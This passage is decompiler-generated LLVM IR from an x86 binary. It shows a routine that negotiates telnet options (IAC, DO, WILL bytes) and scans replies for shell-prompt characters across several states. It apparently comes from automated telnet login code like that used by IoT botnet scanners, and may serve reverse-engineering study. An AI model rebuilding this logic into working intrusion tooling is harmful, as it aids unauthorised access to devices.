  store i32 %v1_8050f39, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_8050f39, 1
  br i1 %tmp136, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8050f3e.preheader

dec_label_pc_8050f3e.preheader:                   ; preds = %dec_label_pc_8050f36
  %v7_8050f3e.pre = load i32, i32* @edx, align 4
  %v2_8050f3e = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_8050f3e

dec_label_pc_8050f3e:                             ; preds = %dec_label_pc_8050f3e.preheader, %dec_label_pc_8050f6f
  %v7_8050f3e = phi i32 [ %v7_8050f3e.pre, %dec_label_pc_8050f3e.preheader ], [ %v9_8050f3e, %dec_label_pc_8050f6f ]
  %v0_8051768 = phi i32 [ %v1_8050f39, %dec_label_pc_8050f3e.preheader ], [ %v1_8050f6f, %dec_label_pc_8050f6f ]
  %v3_8050f3e = add i32 %v2_8050f3e, %v0_8051768
  %v4_8050f3e = inttoptr i32 %v3_8050f3e to i8*
  %v5_8050f3e = load i8, i8* %v4_8050f3e, align 1
  %v6_8050f3e = zext i8 %v5_8050f3e to i32
  %v8_8050f3e = and i32 %v7_8050f3e, -256
  %v9_8050f3e = or i32 %v6_8050f3e, %v8_8050f3e
  store i32 %v9_8050f3e, i32* %edx.global-to-local, align 4
  %v10_8050f42 = icmp eq i8 %v5_8050f3e, 58
  br i1 %v10_8050f42, label %dec_label_pc_8051768, label %dec_label_pc_8050f4b

dec_label_pc_8050f4b:                             ; preds = %dec_label_pc_8050f3e
  %v10_8050f4b = icmp eq i8 %v5_8050f3e, 62
  br i1 %v10_8050f4b, label %dec_label_pc_8051768, label %dec_label_pc_8050f54

dec_label_pc_8050f54:                             ; preds = %dec_label_pc_8050f4b
  %v10_8050f54 = icmp eq i8 %v5_8050f3e, 36
  br i1 %v10_8050f54, label %dec_label_pc_8051768, label %dec_label_pc_8050f5d

dec_label_pc_8050f5d:                             ; preds = %dec_label_pc_8050f54
  %v10_8050f5d = icmp eq i8 %v5_8050f3e, 35
  br i1 %v10_8050f5d, label %dec_label_pc_8051768, label %dec_label_pc_8050f66

dec_label_pc_8050f66:                             ; preds = %dec_label_pc_8050f5d
  %v10_8050f66 = icmp eq i8 %v5_8050f3e, 37
  br i1 %v10_8050f66, label %dec_label_pc_8051768, label %dec_label_pc_8050f6f

dec_label_pc_8050f6f:                             ; preds = %dec_label_pc_8050f66
  %v1_8050f6f = add i32 %v0_8051768, -1
  %v8_8050f6f = icmp eq i32 %v1_8050f6f, 0
  store i32 %v1_8050f6f, i32* %eax.global-to-local, align 4
  %v1_8050f70 = icmp eq i1 %v8_8050f6f, false
  br i1 %v1_8050f70, label %dec_label_pc_8050f3e, label %dec_label_pc_8050f72.backedge

dec_label_pc_8050f72.backedge:                    ; preds = %dec_label_pc_8051413.thread, %dec_label_pc_8050f72.loopexit12.loopexit, %dec_label_pc_8051400, %dec_label_pc_80511ad, %dec_label_pc_8051335, %dec_label_pc_80511f2, %dec_label_pc_8050f6f
  %v0_8050f72 = phi i32 [ %v0_8050fe4, %dec_label_pc_8050f6f ], [ %v0_8050fe4, %dec_label_pc_80511f2 ], [ %v0_8050fe4, %dec_label_pc_8051335 ], [ %v0_8050fe4, %dec_label_pc_80511ad ], [ %v0_8050fe4, %dec_label_pc_8051400 ], [ %v0_8050f72.pre.pre, %dec_label_pc_8050f72.loopexit12.loopexit ], [ %v0_8050fe4, %dec_label_pc_8051413.thread ]
  %v1_8050f72 = add i32 %v0_8050f72, 12
  %v2_8050f72 = inttoptr i32 %v1_8050f72 to i32*
  %v3_8050f72 = load i32, i32* %v2_8050f72, align 4
  store i32 %v3_8050f72, i32* %eax.global-to-local, align 4
  %v1_8050f75 = icmp eq i32 %v3_8050f72, 0
  br i1 %v1_8050f75, label %dec_label_pc_8050f1b, label %dec_label_pc_8050f72.backedge.dec_label_pc_8050f79_crit_edge

dec_label_pc_8050f72.backedge.dec_label_pc_8050f79_crit_edge: ; preds = %dec_label_pc_8050f72.backedge
  %v1_8050f7c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f79

dec_label_pc_8050f72.loopexit12.loopexit:         ; preds = %dec_label_pc_8051413, %dec_label_pc_8051145, %dec_label_pc_80510e5, %dec_label_pc_8050fe4, %dec_label_pc_8051676, %dec_label_pc_80513c3, %dec_label_pc_805134a, %dec_label_pc_805130c, %dec_label_pc_805123d, %dec_label_pc_80515fd, %dec_label_pc_80511b5, %dec_label_pc_80516ef, %dec_label_pc_8051170, %dec_label_pc_8051768, %dec_label_pc_8050f36
  %v0_8050f72.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050f72.backedge

dec_label_pc_8050f79:                             ; preds = %dec_label_pc_8050f72.preheader, %dec_label_pc_8050f72.backedge.dec_label_pc_8050f79_crit_edge
  %v1_8050f7c = phi i32 [ %v1_8050f7c.pre, %dec_label_pc_8050f72.backedge.dec_label_pc_8050f79_crit_edge ], [ %v0_8050f0c, %dec_label_pc_8050f72.preheader ]
  %v0_8050f79 = phi i32 [ %v0_8050f72, %dec_label_pc_8050f72.backedge.dec_label_pc_8050f79_crit_edge ], [ %v0_8050f7227, %dec_label_pc_8050f72.preheader ]
  %v1_8050f79 = add i32 %v0_8050f79, 28
  store i32 %v1_8050f79, i32* %eax.global-to-local, align 4
  %v2_8050f7c = add i32 %v1_8050f7c, 16
  %v3_8050f7c = inttoptr i32 %v2_8050f7c to i32*
  store i32 %v1_8050f79, i32* %v3_8050f7c, align 4
  %v0_8050f80 = load i32, i32* @edi, align 4
  %v1_8050f80 = add i32 %v0_8050f80, 24
  %v2_8050f80 = inttoptr i32 %v1_8050f80 to i32*
  %v3_8050f80 = load i32, i32* %v2_8050f80, align 4
  %v9_8050f80 = icmp eq i32 %v3_8050f80, 256
  br i1 %v9_8050f80, label %dec_label_pc_8051537, label %dec_label_pc_8050f8d

dec_label_pc_8050f8d:                             ; preds = %dec_label_pc_8050f79, %dec_label_pc_8051537
  %v0_8050f8d = load i32, i32* @esp, align 4
  %v1_8050f8d = add i32 %v0_8050f8d, 40
  %v2_8050f8d = inttoptr i32 %v1_8050f8d to i32*
  %v3_8050f8d = load i32, i32* %v2_8050f8d, align 4
  store i32 %v3_8050f8d, i32* %ecx.global-to-local, align 4
  %v1_8050f91 = add i32 %v0_8050f8d, 16
  %v2_8050f91 = inttoptr i32 %v1_8050f91 to i32*
  %v3_8050f91 = load i32, i32* %v2_8050f91, align 4
  store i32 %v3_8050f91, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_8050f9a = inttoptr i32 %v3_8050f8d to i32*
  store i32 0, i32* %v1_8050f9a, align 4
  %v0_8050fa0 = load i32, i32* @edi, align 4
  %v1_8050fa0 = add i32 %v0_8050fa0, 24
  %v2_8050fa0 = inttoptr i32 %v1_8050fa0 to i32*
  %v3_8050fa0 = load i32, i32* %v2_8050fa0, align 4
  store i32 %v3_8050fa0, i32* %edx.global-to-local, align 4
  %v0_8050fa3 = load i32, i32* @esp, align 4
  %v1_8050fa3 = add i32 %v0_8050fa3, -4
  %v2_8050fa3 = inttoptr i32 %v1_8050fa3 to i32*
  store i32 16384, i32* %v2_8050fa3, align 4
  %v0_8050fa8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fa8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050fa8 = add i32 %v1_8050fa8, %v0_8050fa8
  store i32 %v2_8050fa8, i32* @ebx, align 4
  %v0_8050faa = load i32, i32* %eax.global-to-local, align 4
  %v2_8050faa = sub i32 %v0_8050faa, %v1_8050fa8
  store i32 %v2_8050faa, i32* %eax.global-to-local, align 4
  %v2_8050fac = add i32 %v0_8050fa3, -8
  %v3_8050fac = inttoptr i32 %v2_8050fac to i32*
  store i32 %v2_8050faa, i32* %v3_8050fac, align 4
  %v0_8050fad = load i32, i32* @ebx, align 4
  %v2_8050fad = add i32 %v0_8050fa3, -12
  %v3_8050fad = inttoptr i32 %v2_8050fad to i32*
  store i32 %v0_8050fad, i32* %v3_8050fad, align 4
  %v0_8050fae = load i32, i32* @edi, align 4
  %v1_8050fae = add i32 %v0_8050fae, 4
  %v2_8050fae = inttoptr i32 %v1_8050fae to i32*
  %v3_8050fae = load i32, i32* %v2_8050fae, align 4
  %v2_8050fb1 = add i32 %v0_8050fa3, -16
  %v3_8050fb1 = inttoptr i32 %v2_8050fb1 to i32*
  store i32 %v3_8050fae, i32* %v3_8050fb1, align 4
  %v0_8050fb2 = call i32 @function_805324e()
  store i32 %v0_8050fb2, i32* %eax.global-to-local, align 4
  %v0_8050fb7 = load i32, i32* @esp, align 4
  %v1_8050fb7 = add i32 %v0_8050fb7, 16
  %tmp137 = icmp slt i32 %v0_8050fb2, 1
  br i1 %tmp137, label %dec_label_pc_80514cc, label %dec_label_pc_8050fc3

dec_label_pc_8050fc3:                             ; preds = %dec_label_pc_8050f8d
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8050fc5

dec_label_pc_8050fc5:                             ; preds = %dec_label_pc_8050fcf, %dec_label_pc_8050fc3
  %v0_8050fcb = phi i32 [ %v1_8050fcf, %dec_label_pc_8050fcf ], [ 0, %dec_label_pc_8050fc3 ]
  %v1_8050fc5 = load i32, i32* @ebx, align 4
  %v2_8050fc5 = add i32 %v1_8050fc5, %v0_8050fcb
  %v3_8050fc5 = inttoptr i32 %v2_8050fc5 to i8*
  %v4_8050fc5 = load i8, i8* %v3_8050fc5, align 1
  %v5_8050fc5 = icmp eq i8 %v4_8050fc5, 0
  %v1_8050fc9 = icmp eq i1 %v5_8050fc5, false
  br i1 %v1_8050fc9, label %dec_label_pc_8050fcf, label %dec_label_pc_8050fcb

dec_label_pc_8050fcb:                             ; preds = %dec_label_pc_8050fc5
  store i8 65, i8* %v3_8050fc5, align 1
  %v0_8050fcf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050fcf

dec_label_pc_8050fcf:                             ; preds = %dec_label_pc_8050fc5, %dec_label_pc_8050fcb
  %v0_8050fcf = phi i32 [ %v0_8050fcb, %dec_label_pc_8050fc5 ], [ %v0_8050fcf.pre, %dec_label_pc_8050fcb ]
  %v1_8050fcf = add i32 %v0_8050fcf, 1
  store i32 %v1_8050fcf, i32* @edx, align 4
  %v12_8050fd0 = icmp eq i32 %v0_8050fb2, %v1_8050fcf
  %v1_8050fd2 = icmp eq i1 %v12_8050fd0, false
  br i1 %v1_8050fd2, label %dec_label_pc_8050fc5, label %dec_label_pc_8050fd4

dec_label_pc_8050fd4:                             ; preds = %dec_label_pc_8050fcf, %dec_label_pc_80514d2
  %v0_8050fd4 = load i32, i32* @edi, align 4
  %v1_8050fd4 = add i32 %v0_8050fd4, 24
  %v2_8050fd4 = inttoptr i32 %v1_8050fd4 to i32*
  %v3_8050fd4 = load i32, i32* %v2_8050fd4, align 4
  %v2_8050fd7 = add i32 %v3_8050fd4, %v0_8050fb2
  store i32 %v2_8050fd7, i32* @ebx, align 4
  %v0_8050fd9 = load i32, i32* @global_var_80572b0.34, align 16
  store i32 %v0_8050fd9, i32* %eax.global-to-local, align 4
  store i32 %v2_8050fd7, i32* %v2_8050fd4, align 4
  %v0_8050fe1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fe1 = load i32, i32* @edi, align 4
  %v2_8050fe1 = add i32 %v1_8050fe1, 8
  %v3_8050fe1 = inttoptr i32 %v2_8050fe1 to i32*
  store i32 %v0_8050fe1, i32* %v3_8050fe1, align 4
  br label %dec_label_pc_8050fe4

dec_label_pc_8050fe4:                             ; preds = %dec_label_pc_80512ec, %dec_label_pc_8050fd4
  %v0_8050fe4 = load i32, i32* @edi, align 4
  %v1_8050fe4 = add i32 %v0_8050fe4, 12
  %v2_8050fe4 = inttoptr i32 %v1_8050fe4 to i32*
  %v3_8050fe4 = load i32, i32* %v2_8050fe4, align 4
  store i32 %v3_8050fe4, i32* %eax.global-to-local, align 4
  switch i32 %v3_8050fe4, label %dec_label_pc_8050f72.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8050ff4
    i32 3, label %dec_label_pc_8051087
    i32 4, label %dec_label_pc_8051110
    i32 5, label %dec_label_pc_8050f36
    i32 6, label %dec_label_pc_80511b5
    i32 7, label %dec_label_pc_805130c
    i32 8, label %dec_label_pc_8051170
    i32 9, label %dec_label_pc_80513c3
    i32 10, label %dec_label_pc_8051200
  ]

dec_label_pc_8050ff4:                             ; preds = %dec_label_pc_8050fe4
  %v0_8050ff4 = load i32, i32* @esp, align 4
  %v1_8050ff4 = add i32 %v0_8050ff4, 16
  %v2_8050ff4 = inttoptr i32 %v1_8050ff4 to i32*
  %v3_8050ff4 = load i32, i32* %v2_8050ff4, align 4
  store i32 %v3_8050ff4, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8050ffa = add i32 %v0_8050fe4, 24
  %v2_8050ffa = inttoptr i32 %v1_8050ffa to i32*
  %v3_8050ffa = load i32, i32* %v2_8050ffa, align 4
  store i32 %v3_8050ffa, i32* %edx.global-to-local, align 4
  %v2_8050ffd18 = sub i32 0, %v3_8050ffa
  %v10_8050ffd22 = and i32 %v3_8050ffa, %v2_8050ffd18
  %v11_8050ffd23 = icmp slt i32 %v10_8050ffd22, 0
  %v13_8050ffd25 = icmp slt i32 %v2_8050ffd18, 0
  %v2_8050fff26 = icmp eq i1 %v13_8050ffd25, %v11_8050ffd23
  br i1 %v2_8050fff26, label %dec_label_pc_8051413.thread, label %dec_label_pc_8051001.preheader

dec_label_pc_8051413.thread:                      ; preds = %dec_label_pc_8050ff4
  br label %dec_label_pc_8050f72.backedge

dec_label_pc_8051001.preheader:                   ; preds = %dec_label_pc_8050ff4, %dec_label_pc_8050ffd.backedge
  %v0_805107b126 = phi i32 [ %v0_805107b128, %dec_label_pc_8050ffd.backedge ], [ %v0_8050fe4, %dec_label_pc_8050ff4 ]
  %v0_805140b119 = phi i32 [ %v0_8050ffd, %dec_label_pc_8050ffd.backedge ], [ 0, %dec_label_pc_8050ff4 ]
  %v5_8051013108 = phi i32 [ %v5_8051013109, %dec_label_pc_8050ffd.backedge ], [ 2, %dec_label_pc_8050ff4 ]
  %v1_805100d106 = phi i32 [ %v1_8050ffd, %dec_label_pc_8050ffd.backedge ], [ %v3_8050ffa, %dec_label_pc_8050ff4 ]
  %v0_8051006103 = phi i32 [ %v0_8051006104, %dec_label_pc_8050ffd.backedge ], [ %v0_8050ff4, %dec_label_pc_8050ff4 ]
  br label %dec_label_pc_8051001

dec_label_pc_8051001:                             ; preds = %dec_label_pc_8051001.preheader, %dec_label_pc_8051052
  %v0_805107b129 = phi i32 [ %v0_805107b126, %dec_label_pc_8051001.preheader ], [ %v0_8051069, %dec_label_pc_8051052 ]
  %v0_805140b = phi i32 [ %v0_805140b119, %dec_label_pc_8051001.preheader ], [ %v0_805106f, %dec_label_pc_8051052 ]
  %v5_8051013 = phi i32 [ %v5_8051013108, %dec_label_pc_8051001.preheader ], [ %v0_8051064, %dec_label_pc_8051052 ]
  %v1_805100d = phi i32 [ %v1_805100d106, %dec_label_pc_8051001.preheader ], [ %v3_8051069, %dec_label_pc_8051052 ]
  %v0_8051420 = phi i32 [ %v0_8051006103, %dec_label_pc_8051001.preheader ], [ %v1_805106c, %dec_label_pc_8051052 ]
  %v0_8051001 = load i32, i32* @ebx, align 4
  %v1_8051001 = inttoptr i32 %v0_8051001 to i8*
  %v2_8051001 = load i8, i8* %v1_8051001, align 1
  %v12_8051001 = icmp eq i8 %v2_8051001, -1
  %v1_8051004 = icmp eq i1 %v12_8051001, false
  br i1 %v1_8051004, label %dec_label_pc_8051073, label %dec_label_pc_8051006

dec_label_pc_8051006:                             ; preds = %dec_label_pc_8051001
  %v1_8051006 = add i32 %v0_8051420, 16
  %v2_8051006 = inttoptr i32 %v1_8051006 to i32*
  %v3_8051006 = load i32, i32* %v2_8051006, align 4
  %v1_805100a = add i32 %v0_8051001, 1
  store i32 %v1_805100a, i32* @esi, align 4
  %v2_805100d = add i32 %v3_8051006, %v1_805100d
  store i32 %v2_805100d, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_805100d, %v1_805100a
  br i1 %tmp297, label %dec_label_pc_8051013, label %dec_label_pc_8051073

dec_label_pc_8051013:                             ; preds = %dec_label_pc_8051006
  %v2_8051013 = inttoptr i32 %v1_805100a to i8*
  %v3_8051013 = load i8, i8* %v2_8051013, align 1
  %v4_8051013 = zext i8 %v3_8051013 to i32
  %v6_8051013 = and i32 %v5_8051013, -256
  %v7_8051013 = or i32 %v4_8051013, %v6_8051013
  store i32 %v7_8051013, i32* %eax.global-to-local, align 4
  %v11_8051016 = icmp eq i8 %v3_8051013, -1
  br i1 %v11_8051016, label %dec_label_pc_8051408, label %dec_label_pc_805101e

dec_label_pc_805101e:                             ; preds = %dec_label_pc_8051013
  %v11_805101e = icmp eq i8 %v3_8051013, -3
  br i1 %v11_805101e, label %dec_label_pc_8051420, label %dec_label_pc_8051026

dec_label_pc_8051026:                             ; preds = %dec_label_pc_805101e
  %v1_8051026 = add i32 %v0_8051001, 2
  store i32 %v1_8051026, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_805100d, %v1_8051026
  br i1 %tmp298, label %dec_label_pc_805102d, label %dec_label_pc_8051073

dec_label_pc_805102d:                             ; preds = %dec_label_pc_8051026, %dec_label_pc_80519f3, %dec_label_pc_80519fb
  %v4_805102d = phi i32 [ %v6_805149e, %dec_label_pc_80519f3 ], [ %v1_8051026, %dec_label_pc_8051026 ], [ %v4_805102d.pre, %dec_label_pc_80519fb ]
  %v0_805102d = load i32, i32* @esi, align 4
  %v1_805102d = inttoptr i32 %v0_805102d to i8*
  %v2_805102d = load i8, i8* %v1_805102d, align 1
  %v3_805102d = zext i8 %v2_805102d to i32
  %v5_805102d = and i32 %v4_805102d, -256
  %v6_805102d = or i32 %v3_805102d, %v5_805102d
  store i32 %v6_805102d, i32* %eax.global-to-local, align 4
  %v11_805102f = icmp eq i8 %v2_805102d, -3
  br i1 %v11_805102f, label %dec_label_pc_80514b5, label %dec_label_pc_8051037

dec_label_pc_8051037:                             ; preds = %dec_label_pc_80514a8, %dec_label_pc_805102d
  %v0_8051526 = phi i32 [ %v0_80514ab, %dec_label_pc_80514a8 ], [ %v0_805102d, %dec_label_pc_805102d ]
  %v0_8051037 = phi i32 [ %v6_80514ab, %dec_label_pc_80514a8 ], [ %v6_805102d, %dec_label_pc_805102d ]
  %v1_8051037 = trunc i32 %v0_8051037 to i8
  %v11_8051037 = icmp eq i8 %v1_8051037, -5
  br i1 %v11_8051037, label %dec_label_pc_8051526, label %dec_label_pc_805103f

dec_label_pc_805103f:                             ; preds = %dec_label_pc_8051037, %dec_label_pc_8051526
  %v5_805103f = phi i32 [ %v0_8051037, %dec_label_pc_8051037 ], [ %v5_805103f.pre, %dec_label_pc_8051526 ]
  %v0_805103f = load i32, i32* @ebx, align 4
  %v1_805103f = add i32 %v0_805103f, 2
  %v2_805103f = inttoptr i32 %v1_805103f to i8*
  %v3_805103f = load i8, i8* %v2_805103f, align 1
  %v4_805103f = zext i8 %v3_805103f to i32
  %v6_805103f = and i32 %v5_805103f, -256
  %v7_805103f = or i32 %v4_805103f, %v6_805103f
  store i32 %v7_805103f, i32* %eax.global-to-local, align 4
  %v11_8051042 = icmp eq i8 %v3_805103f, -3
  br i1 %v11_8051042, label %dec_label_pc_80514c3, label %dec_label_pc_805104a

dec_label_pc_805104a:                             ; preds = %dec_label_pc_80514b5, %dec_label_pc_805103f
  %v0_805152e = phi i32 [ %v0_80514b8, %dec_label_pc_80514b5 ], [ %v0_805103f, %dec_label_pc_805103f ]
  %v0_805104a = phi i32 [ %v7_80514b8, %dec_label_pc_80514b5 ], [ %v7_805103f, %dec_label_pc_805103f ]
  %v1_805104a = trunc i32 %v0_805104a to i8
  %v11_805104a = icmp eq i8 %v1_805104a, -5
  br i1 %v11_805104a, label %dec_label_pc_805152e, label %dec_label_pc_8051052

dec_label_pc_8051052:                             ; preds = %dec_label_pc_805104a, %dec_label_pc_805152e, %dec_label_pc_80514c3
  %v0_8051052 = load i32, i32* @esp, align 4
  %v1_8051052 = add i32 %v0_8051052, -4
  %v2_8051052 = inttoptr i32 %v1_8051052 to i32*
  store i32 16384, i32* %v2_8051052, align 4
  %v1_8051057 = add i32 %v0_8051052, -8
  %v2_8051057 = inttoptr i32 %v1_8051057 to i32*
  store i32 3, i32* %v2_8051057, align 4
  %v0_8051059 = load i32, i32* @ebx, align 4
  %v2_8051059 = add i32 %v0_8051052, -12
  %v3_8051059 = inttoptr i32 %v2_8051059 to i32*
  store i32 %v0_8051059, i32* %v3_8051059, align 4
  %v0_805105a = load i32, i32* @ebp, align 4
  %v1_805105a = add i32 %v0_805105a, 3
  store i32 %v1_805105a, i32* @ebp, align 4
  %v0_805105d = load i32, i32* @edi, align 4
  %v1_805105d = add i32 %v0_805105d, 4
  %v2_805105d = inttoptr i32 %v1_805105d to i32*
  %v3_805105d = load i32, i32* %v2_805105d, align 4
  store i32 %v3_805105d, i32* %edx.global-to-local, align 4
  %v0_8051060 = load i32, i32* @ebx, align 4
  %v1_8051060 = add i32 %v0_8051060, 3
  store i32 %v1_8051060, i32* @ebx, align 4
  %v2_8051063 = add i32 %v0_8051052, -16
  %v3_8051063 = inttoptr i32 %v2_8051063 to i32*
  store i32 %v3_805105d, i32* %v3_8051063, align 4
  %v0_8051064 = call i32 @function_80532c4()
  store i32 %v0_8051064, i32* %eax.global-to-local, align 4
  %v0_8051069 = load i32, i32* @edi, align 4
  %v1_8051069 = add i32 %v0_8051069, 24
  %v2_8051069 = inttoptr i32 %v1_8051069 to i32*
  %v3_8051069 = load i32, i32* %v2_8051069, align 4
  store i32 %v3_8051069, i32* %edx.global-to-local, align 4
  %v0_805106c = load i32, i32* @esp, align 4
  %v1_805106c = add i32 %v0_805106c, 16
  %v0_805106f = load i32, i32* @ebp, align 4
  %v2_805106f = sub i32 %v0_805106f, %v3_8051069
  %v8_805106f = xor i32 %v0_805106f, %v3_8051069
  %v9_805106f = xor i32 %v2_805106f, %v0_805106f
  %v10_805106f = and i32 %v9_805106f, %v8_805106f
  %v11_805106f = icmp slt i32 %v10_805106f, 0
  %v13_805106f = icmp slt i32 %v2_805106f, 0
  %v2_8051071 = icmp eq i1 %v13_805106f, %v11_805106f
  br i1 %v2_8051071, label %dec_label_pc_8051073, label %dec_label_pc_8051001

dec_label_pc_8051073:                             ; preds = %dec_label_pc_8050ffd.backedge, %dec_label_pc_8051026, %dec_label_pc_8051006, %dec_label_pc_8051052, %dec_label_pc_8051001, %dec_label_pc_8051420.dec_label_pc_8051073.loopexit_crit_edge
  %v0_805107b = phi i32 [ %v0_8051484, %dec_label_pc_8051420.dec_label_pc_8051073.loopexit_crit_edge ], [ %v0_8051069, %dec_label_pc_8051052 ], [ %v0_805107b129, %dec_label_pc_8051026 ], [ %v0_805107b129, %dec_label_pc_8051006 ], [ %v0_805107b129, %dec_label_pc_8051001 ], [ %v0_805107b128, %dec_label_pc_8050ffd.backedge ]
  %v0_8051073 = phi i32 [ %v0_8051073.pre.pre, %dec_label_pc_8051420.dec_label_pc_8051073.loopexit_crit_edge ], [ %v0_805106f, %dec_label_pc_8051052 ], [ %v0_805140b, %dec_label_pc_8051026 ], [ %v0_805140b, %dec_label_pc_8051006 ], [ %v0_805140b, %dec_label_pc_8051001 ], [ %v0_8050ffd, %dec_label_pc_8050ffd.backedge ]
  %tmp138 = icmp slt i32 %v0_8051073, 1
  br i1 %tmp138, label %dec_label_pc_8051413, label %dec_label_pc_805107b

dec_label_pc_805107b:                             ; preds = %dec_label_pc_8051073
  %v1_805107b = add i32 %v0_805107b, 12
  %v2_805107b = inttoptr i32 %v1_805107b to i32*
  store i32 3, i32* %v2_805107b, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_8051087:                             ; preds = %dec_label_pc_8050fe4
  %v1_8051087 = add i32 %v0_8050fe4, 24
  %v2_8051087 = inttoptr i32 %v1_8051087 to i32*
  %v3_8051087 = load i32, i32* %v2_8051087, align 4
  store i32 %v3_8051087, i32* %ecx.global-to-local, align 4
  %v1_805108a = add i32 %v3_8051087, -1
  store i32 %v1_805108a, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_805108a, 1
  br i1 %tmp139, label %dec_label_pc_80510c5, label %dec_label_pc_8051091.preheader

dec_label_pc_8051091.preheader:                   ; preds = %dec_label_pc_8051087
  %v7_8051091.pre = load i32, i32* @edx, align 4
  %v2_8051091 = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_8051091

dec_label_pc_8051091:                             ; preds = %dec_label_pc_8051091.preheader, %dec_label_pc_80510c2
  %v7_8051091 = phi i32 [ %v7_8051091.pre, %dec_label_pc_8051091.preheader ], [ %v9_8051091, %dec_label_pc_80510c2 ]
  %v0_805155a = phi i32 [ %v1_805108a, %dec_label_pc_8051091.preheader ], [ %v1_80510c2, %dec_label_pc_80510c2 ]
  %v3_8051091 = add i32 %v2_8051091, %v0_805155a
  %v4_8051091 = inttoptr i32 %v3_8051091 to i8*
  %v5_8051091 = load i8, i8* %v4_8051091, align 1
  %v6_8051091 = zext i8 %v5_8051091 to i32
  %v8_8051091 = and i32 %v7_8051091, -256
  %v9_8051091 = or i32 %v6_8051091, %v8_8051091
  store i32 %v9_8051091, i32* %edx.global-to-local, align 4
  %v10_8051095 = icmp eq i8 %v5_8051091, 58
  br i1 %v10_8051095, label %dec_label_pc_805155a, label %dec_label_pc_805109e

dec_label_pc_805109e:                             ; preds = %dec_label_pc_8051091
  %v10_805109e = icmp eq i8 %v5_8051091, 62
  br i1 %v10_805109e, label %dec_label_pc_805155a, label %dec_label_pc_80510a7

dec_label_pc_80510a7:                             ; preds = %dec_label_pc_805109e
  %v10_80510a7 = icmp eq i8 %v5_8051091, 36
  br i1 %v10_80510a7, label %dec_label_pc_805155a, label %dec_label_pc_80510b0

dec_label_pc_80510b0:                             ; preds = %dec_label_pc_80510a7
  %v10_80510b0 = icmp eq i8 %v5_8051091, 35
  br i1 %v10_80510b0, label %dec_label_pc_805155a, label %dec_label_pc_80510b9

dec_label_pc_80510b9:                             ; preds = %dec_label_pc_80510b0
  %v10_80510b9 = icmp eq i8 %v5_8051091, 37
  br i1 %v10_80510b9, label %dec_label_pc_805155a, label %dec_label_pc_80510c2

dec_label_pc_80510c2:                             ; preds = %dec_label_pc_80510b9
  %v1_80510c2 = add i32 %v0_805155a, -1
  %v8_80510c2 = icmp eq i32 %v1_80510c2, 0
  store i32 %v1_80510c2, i32* %eax.global-to-local, align 4
  %v1_80510c3 = icmp eq i1 %v8_80510c2, false
  br i1 %v1_80510c3, label %dec_label_pc_8051091, label %dec_label_pc_80510c5

dec_label_pc_80510c5:                             ; preds = %dec_label_pc_80510c2, %dec_label_pc_805155a, %dec_label_pc_8051087
  %v0_80510c5 = load i32, i32* @esp, align 4
  %v1_80510c5 = add i32 %v0_80510c5, -4
  %v2_80510c5 = inttoptr i32 %v1_80510c5 to i32*
  store i32 4, i32* %v2_80510c5, align 4
  %v1_80510c7 = add i32 %v0_80510c5, -8
  %v2_80510c7 = inttoptr i32 %v1_80510c7 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80556a5.46 to i32), i32* %v2_80510c7, align 4
  %v0_80510cc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80510cc = add i32 %v0_80510c5, -12
  %v3_80510cc = inttoptr i32 %v2_80510cc to i32*
  store i32 %v0_80510cc, i32* %v3_80510cc, align 4
  %v1_80510cd = add i32 %v0_80510c5, 16
  %v2_80510cd = inttoptr i32 %v1_80510cd to i32*
  %v3_80510cd = load i32, i32* %v2_80510cd, align 4
  store i32 %v3_80510cd, i32* %eax.global-to-local, align 4
  %v2_80510d1 = add i32 %v0_80510c5, -16
  %v3_80510d1 = inttoptr i32 %v2_80510d1 to i32*
  store i32 %v3_80510cd, i32* %v3_80510d1, align 4
  %v0_80510d2 = call i32 @function_8052690()
  store i32 %v0_80510d2, i32* %eax.global-to-local, align 4
  %v0_80510d7 = load i32, i32* @esp, align 4
  store i32 %v0_80510d2, i32* @ebp, align 4
  %v10_80510dc = icmp eq i32 %v0_80510d2, -1
  %v1_80510df = icmp eq i1 %v10_80510dc, false
  br i1 %v1_80510df, label %dec_label_pc_8051566, label %dec_label_pc_80510e5

dec_label_pc_80510e5:                             ; preds = %dec_label_pc_80510c5
  %v1_80510e5 = add i32 %v0_80510d7, 12
  %v2_80510e5 = inttoptr i32 %v1_80510e5 to i32*
  store i32 5, i32* %v2_80510e5, align 4
  %v1_80510e7 = add i32 %v0_80510d7, 8
  %v2_80510e7 = inttoptr i32 %v1_80510e7 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_80556aa.47 to i32), i32* %v2_80510e7, align 4
  %v0_80510ec = load i32, i32* @edi, align 4
  %v1_80510ec = add i32 %v0_80510ec, 24
  %v2_80510ec = inttoptr i32 %v1_80510ec to i32*
  %v3_80510ec = load i32, i32* %v2_80510ec, align 4
  store i32 %v3_80510ec, i32* %eax.global-to-local, align 4
  %v2_80510ef = add i32 %v0_80510d7, 4
  %v3_80510ef = inttoptr i32 %v2_80510ef to i32*
  store i32 %v3_80510ec, i32* %v3_80510ef, align 4
  %v1_80510f0 = add i32 %v0_80510d7, 32
  %v2_80510f0 = inttoptr i32 %v1_80510f0 to i32*
  %v3_80510f0 = load i32, i32* %v2_80510f0, align 4
  store i32 %v3_80510f0, i32* %eax.global-to-local, align 4
  %v3_80510f4 = inttoptr i32 %v0_80510d7 to i32*
  store i32 %v3_80510f0, i32* %v3_80510f4, align 4
  %v0_80510f5 = call i32 @function_8052690()
